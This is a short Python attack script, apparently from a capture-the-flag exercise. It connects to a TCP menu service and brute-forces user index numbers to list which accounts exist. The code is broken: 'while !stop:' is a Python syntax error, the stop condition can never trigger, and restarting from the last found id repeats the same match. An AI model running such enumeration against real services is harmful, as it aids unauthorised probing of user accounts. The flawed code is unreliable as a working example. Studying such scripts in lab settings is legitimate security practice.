#!/usr/bin/python3
import socket
import sys

def send_message(s, message):
    s.sendall(message)
    data = s.recv(1024)
    return data.decode('utf-8')

if __name__ == "__main__":
    HOST=sys.argv[1]
    PORT=int(sys.argv[2])
    found = []
    stop=False
    print(f'[!] Connecting to {HOST} on port {PORT}')
    while !stop:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
    
            # > enter your name
            print(send_message(s,b"Jack"))
            
            last_found = 0 if len(found) == 0 else found[-1]
            for i in range(last_found, 999):
                if i == 999:
                    stop = True

                # Bruteforce users index
                print(send_message(s,b"2"))
                print(send_message(s,b"1"))
    
                response = send_message(s, str(i).encode())
                if response != "" and 'no such user!' not in response:
                    found.append(i)
                    print(f"Found: {i}")
                    break


    print(f"Found the following ids: {found}")
    
